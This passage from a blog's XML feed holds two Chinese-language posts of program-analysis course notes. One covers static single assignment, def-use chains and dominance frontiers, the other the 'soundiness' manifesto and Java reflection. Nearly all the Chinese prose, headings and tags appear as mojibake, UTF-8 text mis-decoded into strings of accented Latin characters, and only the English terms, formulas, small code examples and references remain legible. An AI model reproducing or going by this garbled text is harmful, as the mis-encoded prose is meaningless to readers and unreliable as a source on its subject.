      <url>/pl-%E5%8C%97%E5%A4%A7%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88SSA%E5%92%8C%E7%A8%80%E7%96%8F%E5%88%86%E6%9E%90%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°æ®æµåˆ†æçš„é—®é¢˜"><a href="#æ•°æ®æµåˆ†æçš„é—®é¢˜" class="headerlink" title="æ•°æ®æµåˆ†æçš„é—®é¢˜"></a>æ•°æ®æµåˆ†æçš„é—®é¢˜</h1><p>å…ˆå‰æœ‰å¾ˆå¤šæ•°æ®æµåˆ†æé—®é¢˜éƒ½æ˜¯å…³äºå˜é‡ä¸­çš„å€¼åˆ†æï¼Œä¾‹å¦‚ï¼šç¬¦å·åˆ†æã€å¸¸é‡ä¼ æ’­ã€æ±¡ç‚¹åˆ†æç­‰ã€‚è€ƒè™‘å¯¹ä»¥ä¸‹CFGåšæ•°å€¼åˆ†æï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201002210707678.png" alt="image-20201002210707678" style="width:50%;"></p><ul><li>åœ¨ç©ºé—´å¤æ‚åº¦æ–¹é¢ï¼Œå¯¹æ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦ä¿å­˜ä¸€ä»½å…³äºx, y, zçš„å€¼ï¼Œè€Œä¸€ä¸ªèŠ‚ç‚¹é€šå¸¸åªå½±å“äº†å°‘æ•°å˜é‡ï¼ˆå¦‚èŠ‚ç‚¹2ä¸y,z æ— å…³ï¼‰</li><li>åœ¨æ—¶é—´å¤æ‚åº¦æ–¹é¢ï¼Œå¯¹å½“èŠ‚ç‚¹ä¸€æ›´æ–°yæ—¶ï¼Œæ›´æ–°è‡³äºèŠ‚ç‚¹3æœ‰å…³ï¼Œä½†æ˜¯æ•°æ®æµå¿…é¡»é€šè¿‡2æ‰èƒ½ä¼ åˆ°3</li></ul><a id="more"></a><h1 id="åŸºäºDef-Useçš„æ•°æ®æµåˆ†æ"><a href="#åŸºäºDef-Useçš„æ•°æ®æµåˆ†æ" class="headerlink" title="åŸºäºDef-Useçš„æ•°æ®æµåˆ†æ"></a>åŸºäºDef-Useçš„æ•°æ®æµåˆ†æ</h1><h2 id="Def-Useå…³ç³»"><a href="#Def-Useå…³ç³»" class="headerlink" title="Def-Useå…³ç³»"></a>Def-Useå…³ç³»</h2><blockquote><p>ç»™å®šå˜é‡xï¼Œå¦‚æœç»“ç‚¹Aå¯èƒ½æ”¹å˜xçš„å€¼ï¼Œç»“ç‚¹Bå¯èƒ½ä½¿ç”¨ç»“ç‚¹Aæ”¹å˜åçš„xçš„å€¼ï¼Œåˆ™ç»“ç‚¹Aå’Œç»“ç‚¹Bå­˜åœ¨Def-Useå…³ç³»</p></blockquote><p>ä»¥ä¸Šé¢çš„CFGæ¥è¯´ï¼ŒèŠ‚ç‚¹0å’ŒèŠ‚ç‚¹1ï¼ŒèŠ‚ç‚¹1å’ŒèŠ‚ç‚¹3å°±å­˜åœ¨Def-Useå…³ç³»ã€‚</p><p>åŸºäºDef-Useçš„æ•°æ®æµåˆ†æé¦–å…ˆå°†å…¶è½¬æ¢ä¸ºDef-Useè¾¹çš„å›¾ï¼Œå†æ ¹æ®DefUseè¾¹åšæ•°æ®æµåˆ†æï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201002211638949.png" alt="image-20201002211638949"></p><p>ä¾‹å¦‚ä¸Šå›¾ï¼Œæœ‰ä»¥ä¸‹è½¬æ¢å‡½æ•°ï¼š</p><ul><li>$y_0=f_0()$</li><li>$y_1=f_1(y_0\sqcap y_1)$</li><li>$x_2=f_2(x_2\sqcap x_0)$</li><li>$z_3=f_3(y_0\sqcap y_1)$</li></ul><p>å¯¹Def-Useçš„æ•°æ®æµåˆ†ææœ‰ä»¥ä¸‹å¥½å¤„ï¼š</p><ul><li>èŠ‚ç‚¹åªéœ€ä¿å­˜ä¸è‡ªå·±ç›¸å…³çš„æŠ½è±¡å€¼</li><li>å›¾ä¸Šçš„è¾¹å¤§å¤§å‡å°‘ï¼Œå³å›¾å˜ä¸ºç¨€ç–å›¾</li><li>åˆ†ææ•ˆç‡æé«˜</li></ul><h2 id="ç›¸å…³æ€§è´¨"><a href="#ç›¸å…³æ€§è´¨" class="headerlink" title="ç›¸å…³æ€§è´¨"></a>ç›¸å…³æ€§è´¨</h2><ul><li>mayåˆ†æï¼Œè¿”å›ç»“æœæ˜¯çœŸå®ç»“æœçš„è¶…é›†ï¼›</li><li>soundnesså’Œprecisionï¼Œç­‰æ•ˆäºåŸæ•°æ®æµåˆ†ææ•ˆæœã€‚</li></ul><h2 id="éœ€è¦è§£å†³çš„é—®é¢˜"><a href="#éœ€è¦è§£å†³çš„é—®é¢˜" class="headerlink" title="éœ€è¦è§£å†³çš„é—®é¢˜"></a>éœ€è¦è§£å†³çš„é—®é¢˜</h2><p>é—®é¢˜1ï¼šå¦‚ä½•æ„é€ Def-Useï¼Ÿ</p><p>å¯ä»¥ç”¨Reaching Definitionåˆ†æå¾—åˆ°ï¼Œé‚£ä¹ˆåˆ†æå¤æ‚åº¦ä¸º $O(nm^2)$ï¼Œnä¸ºæ§åˆ¶æµå›¾èŠ‚ç‚¹ï¼Œmä¸ºèµ‹å€¼è¯­å¥ä¸ªæ•°ï¼Œé€Ÿåº¦ä¸å¤Ÿå¿«ã€‚</p><p>é—®é¢˜2ï¼šå¦‚æœåˆ†æ”¯è¯­å¥è¿‡å¤šï¼ŒDef-Useçš„è¾¹åè€Œä¼šå¢åŠ ï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003114329338.png" alt="image-20201003114329338"></p><h1 id="é™æ€å•èµ‹å€¼å’Œç¨€ç–åˆ†æ"><a href="#é™æ€å•èµ‹å€¼å’Œç¨€ç–åˆ†æ" class="headerlink" title="é™æ€å•èµ‹å€¼å’Œç¨€ç–åˆ†æ"></a>é™æ€å•èµ‹å€¼å’Œç¨€ç–åˆ†æ</h1><h2 id="é™æ€å•èµ‹å€¼"><a href="#é™æ€å•èµ‹å€¼" class="headerlink" title="é™æ€å•èµ‹å€¼"></a>é™æ€å•èµ‹å€¼</h2><p>ä¸ºè§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå¼•å…¥é™æ€å•èµ‹å€¼ï¼ˆSSAï¼‰ï¼Œåœ¨SSAä¸­ï¼Œæ¯ä¸ªå˜é‡åªè¢«èµ‹å€¼ä¸€æ¬¡ï¼Œå¹¶ä¸”å¼•å…¥$\phi()$å‡½æ•°è¡¨ç¤ºæ§åˆ¶æµæ±‡èšçš„æƒ…å†µï¼Œä¾‹å¦‚å¦‚ä¸‹ä»£ç ï¼ˆå·¦ä¾§ï¼‰è¡¨ç¤ºä¸ºé™æ€å•èµ‹å€¼å½¢å¼ï¼ˆå³ä¾§ï¼‰ï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003114951916.png" alt="image-20201003114951916" style="width:80%;"></p><p>SSAæœ‰å¦‚ä¸‹å‡ ä¸ªå¥½å¤„ï¼š</p><ul><li><p>SSAç›´æ¥æä¾›äº†def-useé“¾ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œç­‰å·å·¦è¾¹å˜é‡ä¸ºå…¥åº¦ï¼Œç­‰å·å³è¾¹å˜é‡ä¸ºå‡ºåº¦ï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003115232485.png" alt="image-20201003115232485" style="width:80%;"></p></li><li><p>SSAçš„è¾¹ä¸ä¼šå¹³æ–¹å¢é•¿ï¼ˆå› ä¸ºæœ‰$\phi()$ï¼‰ï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003115325736.png" alt="image-20201003115325736"></p></li><li><p>SSAä¸Šçš„æµéæ•æ„Ÿåˆ†æå’Œæµæ•æ„Ÿåˆ†æç­‰ä»·ï¼ˆå˜é‡é—´èµ‹å€¼å…³ç³»åæ˜ äº†æ•°æ®æµå‘ï¼‰</p></li></ul><h2 id="ç¨€ç–åˆ†æ"><a href="#ç¨€ç–åˆ†æ" class="headerlink" title="ç¨€ç–åˆ†æ"></a>ç¨€ç–åˆ†æ</h2><p>åŸºäºSSAçš„åˆ†æè¢«ç§°ä¸º<strong>ç¨€ç–åˆ†æ</strong>ï¼ˆsparse program analysisï¼‰</p><h1 id="æ„é€ SSA"><a href="#æ„é€ SSA" class="headerlink" title="æ„é€ SSA"></a>æ„é€ SSA</h1><p>é¦–å…ˆè®¨è®º$\phi$çš„åŠ å…¥æ¡ä»¶ï¼Œå¯¹äºä¸€ä¸ªä»£ç å—Bï¼Œè‹¥æ»¡è¶³ä¸€ä¸‹æ¡ä»¶ï¼Œéœ€è¦åœ¨Bå‰åŠ $\phi$ï¼š</p><ol><li><p>åˆ°è¾¾Bçš„è·¯å¾„â‰¥2ï¼›</p></li><li><p>å…¶ä¸­æœ‰ä¸€æ¡è·¯å¾„ç»è¿‡äº†æŸå˜é‡içš„èµ‹å€¼è¯­å¥sï¼›</p></li><li><p>æœ‰ä¸€æ¡è·¯å¾„æ²¡æœ‰ç»è¿‡sï¼›</p></li><li><p>så’ŒBä¹‹é—´æ²¡æœ‰åˆ«çš„ä»£ç å—æ»¡è¶³æ¡ä»¶ã€‚</p></li></ol><h2 id="æ”¯é…å…³ç³»"><a href="#æ”¯é…å…³ç³»" class="headerlink" title="æ”¯é…å…³ç³»"></a>æ”¯é…å…³ç³»</h2><p><strong>èŠ‚ç‚¹Aæ”¯é…ï¼ˆdominateï¼‰èŠ‚ç‚¹B</strong>ï¼ŒæŒ‡æ‰€æœ‰ä»Entryåˆ°Bçš„è·¯å¾„éƒ½è¦ç»è¿‡Aï¼Œå¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼ŒAéƒ½æ”¯é…Bï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003162723477.png" alt="image-20201003162723477"></p><p><strong>ç»“ç‚¹Aä¸¥æ ¼æ”¯é…ï¼ˆStrictly dominateï¼‰ç»“ç‚¹B</strong>ï¼ŒAæ”¯é…Bå¹¶ä¸”Aå’ŒBä¸æ˜¯ä¸€ä¸ªç»“ç‚¹ï¼ˆå¦‚ä¸Šå›¾ä¸­ï¼Œåªæœ‰å·¦å›¾Aä¸¥æ ¼æ”¯é…Bï¼‰ã€‚</p><p><strong>ç»“ç‚¹Açš„æ”¯é…è¾¹ç•Œï¼ˆDominance Frontierï¼‰ä¸­åŒ…æ‹¬B</strong>ï¼Œå½“ä¸”ä»…å½“ï¼š</p><ul><li><p>Aæ”¯é…Bçš„æŸä¸€ä¸ªå‰é©±ç»“ç‚¹ï¼Œå³Aåœ¨Bçš„æŸæ¡è·¯å¾„ä¸Šï¼š</p>  <pre class="mermaid">    graph TB      a((A)) --> c((C))      a --> e(( ))      e --> c      c --> b((B))      f(( )) --> b</pre></li><li><p>æˆ–è€…ï¼ŒAä¸ä¸¥æ ¼æ”¯é…Bï¼Œå³A==Bï¼š</p>  <pre class="mermaid">    graph TB      a((A==B)) --> e(( ))      e -->a</pre><p>  å¯¹äºä»»æ„èµ‹å€¼è¯­å¥<code>x=...</code>æ‰€åœ¨çš„èŠ‚ç‚¹Aï¼Œåœ¨Açš„æ‰€æœ‰æ”¯é…è¾¹ç•Œæ’å…¥$\phi$ã€‚</p></li></ul><p>å¯¹ä»»æ„å˜é‡iï¼Œä»¤ A ä¸ºæ‰€æœ‰å¯¹ i èµ‹å€¼çš„èŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹ $a \in A$ï¼Œ$DF(a)$ä¸º a çš„æ”¯é…è¾¹ç•Œé›†åˆï¼Œ$DF^+(A)$ ä¸ºæ‰€æœ‰éœ€è¦æ’å…¥ $\phi(i)$ çš„èŠ‚ç‚¹ï¼š</p><ul><li>$\mathrm{DF}(\mathrm{A})=\mathrm{U}_{\{\mathrm{a} \in \mathrm{A}\}} \mathrm{DF}(\mathrm{a})$</li><li>$\mathrm{DF}^{+}(\mathrm{A})=\lim _{i \rightarrow \infty} D F^{i}(A)$<ul><li>$DF^{1}(A)=DF(A)$</li><li>$DF^{i+1}(A)=D F\left(\cup_{j \leq i} DF^{j}(A)\right)$</li></ul></li></ul><h2 id="è®¡ç®—æ”¯é…è¾¹ç•Œ"><a href="#è®¡ç®—æ”¯é…è¾¹ç•Œ" class="headerlink" title="è®¡ç®—æ”¯é…è¾¹ç•Œ"></a>è®¡ç®—æ”¯é…è¾¹ç•Œ</h2><p>è®¡ç®—ç›´æ¥æ”¯é…è€…ï¼ˆimmediate dominatorï¼‰ï¼šaä¸¥æ ¼æ”¯é…bï¼Œå¹¶ä¸”ä¸å­˜åœ¨cï¼Œaä¸¥æ ¼æ”¯é…cä¸”cä¸¥æ ¼æ”¯é…bï¼Œ åˆ™aæ˜¯bçš„ç›´æ¥æ”¯é…è€…ï¼Œè®°ä¸ºidom(b) </p><p>ç›´æ¥æ”¯é…å…³ç³»å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ ‘ï¼Œå³æ”¯é…æ ‘ï¼Œæ”¯é…æ ‘å¯ä»¥åæ˜ æ”¯é…è¾¹ç•Œï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003170259206.png" alt="image-20201003170259206"></p><p>è®¡ç®—æ”¯é…æ ‘çš„ç®—æ³•æœ‰ä¸¤ç§ï¼š</p><ul><li>Lengauer and Tarjanç®—æ³•<ul><li>å¤æ‚åº¦ä¸º$O(E\alpha(E,N))$</li><li>Eä¸ºè¾¹æ•°ï¼ŒNä¸ºç»“ç‚¹æ•°ï¼Œğ›¼ä¸ºAckermanå‡½æ•°çš„é€†ï¼ˆAckermanå‡½æ•°åŸºæœ¬å¯ä»¥è®¤ä¸ºæ˜¯å¸¸æ•°ï¼‰</li></ul></li><li>Cooper, Harvey, Kennedyç®—æ³•<ul><li>å¤æ‚åº¦ä¸º $O(N^2)$ï¼Œå®é™…æ¯” Lengauer and Tarjan å¿«</li></ul></li></ul><h1 id="é™æ€å•èµ‹å€¼çš„é™åˆ¶å’Œå®é™…åšæ³•"><a href="#é™æ€å•èµ‹å€¼çš„é™åˆ¶å’Œå®é™…åšæ³•" class="headerlink" title="é™æ€å•èµ‹å€¼çš„é™åˆ¶å’Œå®é™…åšæ³•"></a>é™æ€å•èµ‹å€¼çš„é™åˆ¶å’Œå®é™…åšæ³•</h1><p> SSAéœ€è¦æ¯ä¸ªå†…å­˜ä½ç½®ä¸€æ—¦èµ‹å€¼ï¼Œå…¶å€¼éƒ½ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œä½†æ˜¯åœ¨æŒ‡é’ˆæ“ä½œæ—¶å¹¶ä¸æ»¡è¶³ï¼Œä¾‹å¦‚ä¸‹é¢Cä»£ç çš„æŒ‡é’ˆæ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">10</span>;</span><br><span class="line">i=&amp;a;</span><br><span class="line">*i=<span class="number">20</span>;</span><br><span class="line">b=a; <span class="comment">// b=?</span></span><br><span class="line"><span class="comment">/* to SSA */</span></span><br><span class="line">a=<span class="number">10</span>;</span><br><span class="line">i=&amp;a;</span><br><span class="line">*i=<span class="number">20</span>;</span><br><span class="line">b=a; <span class="comment">// b=10</span></span><br></pre></td></tr></table></figure><p>å°†å…¶ç¿»è¯‘æˆSSAä¹‹åï¼Œå¯ä»¥çœ‹åˆ°bå€¼å®é™…ä¸Šè¢«å˜é‡ $i$ å½±å“ï¼Œä½†æ˜¯SSAæ²¡æ³•ååº”è¿™ä¸ªä¿¡æ¯ï¼Œå› æ­¤åˆ†æä¸‹æ¥ $b=10$ ï¼Œè¿™ç§æƒ…å†µåœ¨javaä¹Ÿå­˜åœ¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a.f=<span class="number">10</span>;</span><br><span class="line">y=a;</span><br><span class="line">y.f=<span class="number">20</span>;</span><br><span class="line">b=a.f; <span class="comment">// b=?</span></span><br><span class="line"><span class="comment">/* to SSA */</span></span><br><span class="line">a.f=<span class="number">10</span>;</span><br><span class="line">y=a;</span><br><span class="line">y.f=<span class="number">20</span>;</span><br><span class="line">b=a.f; <span class="comment">// b=10</span></span><br></pre></td></tr></table></figure><p>å› æ­¤åœ¨å®é™…ä½¿ç”¨æ—¶ï¼Œä¼šåšéƒ¨åˆ†SSAï¼Œåªå¯¹èƒ½è½¬æ¢çš„ç»„åšä¼˜åŒ–ã€‚</p><p>å¯¹äºJavaæ¥è¯´ï¼Œæ ˆä¸Šçš„å˜é‡ä¸ºä¼˜åŒ–ç»„ï¼Œå †ä¸Šçš„å˜é‡ä¸ºä¸ä¼˜åŒ–ç»„ï¼›</p><p>å¯¹äºCçš„æƒ…å†µï¼šå’Œtop-levelï¼ˆä»æ²¡è¢«&amp;å–è¿‡åœ°å€çš„å˜é‡ï¼‰ä¸ºä¼˜åŒ–ç»„ï¼Œaddress-takenï¼ˆæ›¾ç»è¢«&amp;å–è¿‡åœ°å€çš„å˜é‡ ï¼‰ä¸ºä¸ä¼˜åŒ–ç»„ã€‚</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li>è½¯ä»¶åˆ†ææŠ€æœ¯ï¼ŒåŒ—äº¬å¤§å­¦ï¼Œ<a href="https://xiongyingfei.github.io/SA/2019/05_static_single_assignment.pdf" target="_blank" rel="noopener">https://xiongyingfei.github.io/SA/2019/05_static_single_assignment.pdf</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
            <tag> æ•°æ®æµåˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆSoundinessï¼‰</title>
      <link href="/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88Soundiness%EF%BC%89/"/>
      <url>/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88Soundiness%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Soundiness"><a href="#Soundiness" class="headerlink" title="Soundiness"></a>Soundiness</h1><p>Soundinessæ˜¯äº”å¹´å‰çš„æ¦‚å¿µï¼Œå­¦è€…ä»¬å‘ç°ç¨‹åºåˆ†æç”¨äºå®é™…çš„ç°ä»£è¯­è¨€ä¸­ä»å­˜åœ¨å„ç§é—®é¢˜ï¼Œè¿™äº›é—®é¢˜æ˜¯éš¾ä»¥åˆ†æçš„è¯­è¨€ç‰¹æ€§å¯¼è‡´çš„ï¼Œå› æ­¤æå‡ºSoundinessï¼Œè¯´æ˜å¦‚ä½•å¤„ç†è¿™äº›éš¾è§£çš„é—®é¢˜ã€‚</p><h2 id="Hard-features"><a href="#Hard-features" class="headerlink" title="Hard features"></a>Hard features</h2><blockquote><p>Hard-to-analyze features: an aggressively conservative treatment to these features will likely make the analysis too imprecise to scale,rendering the analysis useless.</p></blockquote><a id="more"></a><p>ä¾‹å¦‚ï¼š</p><ul><li>Java<ul><li>Reflectionï¼Œnative codeï¼Œdynamic class loadingï¼Œâ€¦</li></ul></li><li>JavaScript<ul><li>evalï¼ŒDOMï¼ˆdocument object modelï¼‰ï¼Œâ€¦</li></ul></li><li>C/C++<ul><li>æŒ‡é’ˆæ“ä½œï¼Œå‡½æ•°æŒ‡é’ˆï¼Œâ€¦</li></ul></li></ul><p>å› ä¸ºè¿™äº›åŸå› ï¼Œå®é™…ä¸Šï¼š</p><ul><li><p>å­¦æœ¯ç•Œæ‰€æœ‰æŠ€æœ¯åº”ç”¨äºå®é™…è¯­è¨€æ—¶éƒ½æœ‰unsoundçš„æƒ…å†µï¼›</p></li><li><p>å·¥ä¸šç•Œæ‰€æœ‰æ‰«æå™¨éƒ½å¿…é¡»æ¥å—unsoundçš„ç»“æœã€‚</p></li></ul><p>è¿™é€ æˆå¦‚ä¸‹ç»“æœï¼š</p><ul><li>å¤§å¤šæ•°å­¦æœ¯å·¥ä½œå®£ç§°soundï¼Œä½†æ˜¯ç”±äºè¿™äº›ç‰¹æ€§å®é™…ä¸æ˜¯soundçš„ï¼›</li><li>å¤§éƒ¨åˆ†å·¥ä½œä¸è¯´å¦‚ä½•å¤„ç†hardï¼Œæˆ–è€…åœ¨å®ç°ç« èŠ‚ç­‰ä¸èµ·çœ¼çš„éƒ¨åˆ†ç®€å•ä»‹ç»ï¼ˆoff-hand mannerï¼‰ï¼›</li><li>è¿™äº›hardåˆ†æä¼šå¯¹åˆ†æç»“æœé€ æˆå·¨å¤§å½±å“ï¼Œå¦‚javaåå°„ï¼›</li></ul><ul><li>å¯¹äºéä¸“å®¶çš„è¯»è€…ï¼Œä»–ä»¬è¯¯ä»¥ä¸ºåˆ«äººè®ºæ–‡éƒ½æ˜¯soundçš„ï¼›</li><li>å¯¹ä¸“å®¶ï¼Œç”±äºä¸äº†è§£ hard features å¦‚ä½•å¤„ç†ï¼Œå¾ˆéš¾åˆ¤æ–­åˆ†æç²¾åº¦ã€‚</li></ul><h2 id="Soundiness-1"><a href="#Soundiness-1" class="headerlink" title="Soundiness"></a>Soundiness</h2><p>æœ€ç»ˆï¼Œåœ¨2015å¹´ï¼Œåä½PLçš„é¡¶çº§ä¸“å®¶è”åˆå®£è¨€[1]ï¼Œå‘¼åå­¦è€…ä»¬åœ¨ä»Šåè®ºæ–‡é‡Œæ˜ç¡®è¯´æ˜å¯¹hard featureçš„å¤„ç†æ–¹å¼ï¼Œæå«Soundinessã€‚</p><p>Soundinessè¯æ ¹æ¥æºäºsoundy:</p><blockquote><p>A soundy analysis typically means that the analysis ismostly sound, with well-identified unsound treatments to hard/specific language features.</p></blockquote><p>çµæ„Ÿæ¥æºäºTruthinessï¼Œæ„æ€è®©äººä¿¡ä»¥ä¸ºçœŸï¼Œå´æ²¡æœ‰äº‹å®è¯æ˜çš„ç†è®ºã€‚</p><h2 id="Soundness-Soundiness-and-Unsoundness"><a href="#Soundness-Soundiness-and-Unsoundness" class="headerlink" title="Soundness, Soundiness and Unsoundness"></a>Soundness, Soundiness and Unsoundness</h2><ul><li>Soundnessï¼š ä¸€ä¸ª sound çš„åˆ†æå¯ä»¥è€ƒè™‘åˆ°æ‰€æœ‰çš„ç¨‹åºè¿è¡Œæ—¶è¡Œä¸ºï¼›</li><li>Soundinessï¼šä¸€ä¸ª soundiness çš„åˆ†æå¯¹äºç¨‹åº hard features æœ‰ä¸€å®šåˆç†çš„å¤„ç†ï¼Œç»å¤§æƒ…å†µä¸‹æ˜¯soundçš„ï¼›</li><li>Unsoundnessï¼šæ–¹æ³•è®¾è®¡ä¸­ä¸ºè¿½æ±‚é€Ÿåº¦ã€é€šç”¨æ€§ç­‰å¿½ç•¥soundçš„åˆ†æã€‚</li></ul><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><p>åå°„æ˜¯Javaçš„åŠ¨æ€ç‰¹æ€§ï¼Œåªæœ‰è¿è¡Œæ—¶æ‰å¯çŸ¥å…·ä½“ç±»ã€‚</p><h2 id="String-Constant-Analysis-Pointer-Analysis"><a href="#String-Constant-Analysis-Pointer-Analysis" class="headerlink" title="String Constant Analysis + Pointer Analysis"></a>String Constant Analysis + Pointer Analysis</h2><p>Livshits[2] ç­‰äººä½¿ç”¨å­—ç¬¦ä¸²å¸¸é‡åˆ†æå’ŒæŒ‡é’ˆåˆ†æè·å–åå°„çš„å…·ä½“å€¼ï¼Œä½†æ˜¯å¯¹äºé…ç½®æ–‡ä»¶ã€ç½‘ç»œã€ç”¨æˆ·è¾“å‡ºç­‰å¤æ‚æƒ…å†µä»ç„¶å…·æœ‰å±€é™æ€§ã€‚</p><h2 id="Type-Inference-String-analysis-Pointer-Analysis"><a href="#Type-Inference-String-analysis-Pointer-Analysis" class="headerlink" title="Type Inference + String analysis + Pointer Analysis"></a>Type Inference + String analysis + Pointer Analysis</h2><p>Li[3]ç­‰äººï¼ˆå°±æ˜¯è€å¸ˆOrzï¼‰é€šè¿‡è°ƒç”¨å‚æ•°çš„ç±»å‹ã€å­—ç¬¦ä¸²åˆ†æå’ŒæŒ‡é’ˆåˆ†æè·å–åå°„çš„å…·ä½“å€¼ï¼Œå³è™½ç„¶åœ¨åå°„ç‚¹æ— æ³•è§£æç±»ï¼Œä½†æ˜¯é€šè¿‡ä½¿ç”¨æ—¶çš„ç‰¹å¾å¯ä»¥æ¨å¯¼åŸå‡½æ•°ï¼Œåœ¨å®éªŒä¸­ï¼Œå·¥å…·æ¨å¯¼å‡º50ä¸ªç›®æ ‡çš„ç›®æ ‡å‡½æ•°ï¼Œå…¶ä¸­48ä¸ªæ˜¯çœŸå®çš„ã€‚</p><p>ä»–ä»¬çš„åç»§å·¥ä½œ[4] æ˜¯ç›®å‰æœ€å…ˆè¿›çš„åå°„å¤„ç†æ–¹å¼ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆSoundinessï¼‰/image-20200915202808772.png" alt="image-20200915202808772"></p><h2 id="Assisted-by-Dynamic-Analysis"><a href="#Assisted-by-Dynamic-Analysis" class="headerlink" title="Assisted by Dynamic Analysis"></a>Assisted by Dynamic Analysis</h2><p>Bodden[5] ç­‰äººæå‡ºå€ŸåŠ©äºæµ‹è¯•ç”¨ä¾‹åŠ¨æ€è¿è¡Œç¨‹åºï¼Œèƒ½è§£å‡ºçœŸå®çš„åå°„ç»“æœï¼Œè¿™ä¸€ç±»å·¥ä½œå®é™…ä¸Šæˆä¸ºæœ€ä¸ºå¸¸ç”¨çš„å·¥ä½œã€‚</p><h1 id="Native-Language"><a href="#Native-Language" class="headerlink" title="Native Language"></a>Native Language</h1><h2 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h2><p>Javaé€šè¿‡JNIæ¥å£è°ƒç”¨C/C++ç¨‹åºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆSoundinessï¼‰/image-20200915203915073.png" alt="image-20200915203915073"></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>ä¸»è¦æ–¹æ³•æ˜¯æ‰‹åŠ¨å»ºæ¨¡ï¼Œå°†JNIå‡½æ•°è½¬åŒ–ä¸ºjavaä»£ç ï¼Œå†è½¬åŒ–ä¸ºåˆ†æè§„åˆ™<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆSoundinessï¼‰/image-20200915204053331.png" alt="image-20200915204053331"></p><p>Fourtounis[6]ç­‰äººå°†ä¸€äº›javaçš„nativeå‡½æ•°è¿˜åŸæˆæ¨¡å‹ã€‚</p><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><p>å…¶ä»–ä¸Soundinessçš„å·¥ä½œï¼š<a href="http://soundiness.org/" target="_blank" rel="noopener">http://soundiness.org/</a></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li>Livshits B, Sridharan M, Smaragdakis Y, et al. In defense of soundiness: a manifesto[J]. Communications of the ACM, 2015, 58(2): 44-46.</li><li>Livshits B, Whaley J, Lam M S. Reflection analysis for Java[C]//Asian Symposium on Programming Languages and Systems. Springer, Berlin, Heidelberg, 2005: 139-160.</li><li>Li Y, Tan T, Sui Y, et al. Self-inferencing reflection resolution for Java[C]//European Conference on Object-Oriented Programming. Springer, Berlin, Heidelberg, 2014: 27-53.</li><li>Li Y, Tan T, Xue J. Understanding and analyzing java reflection[J]. ACM Transactions on Software Engineering and Methodology (TOSEM), 2019, 28(2): 1-50.</li><li>Bodden E, Sewe A, Sinschek J, et al. Taming reflection: Aiding static analysis in the presence of reflection and custom class loaders[C]//2011 33rd International Conference on Software Engineering (ICSE). IEEE, 2011: 241-250.</li><li>Fourtounis G, Triantafyllou L, Smaragdakis Y. Identifying Java calls in native code via binary scanning[C]//Proceedings of the 29th ACM SIGSOFT International Symposium on Software Testing and Analysis. 2020: 388-400.</li></ol>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
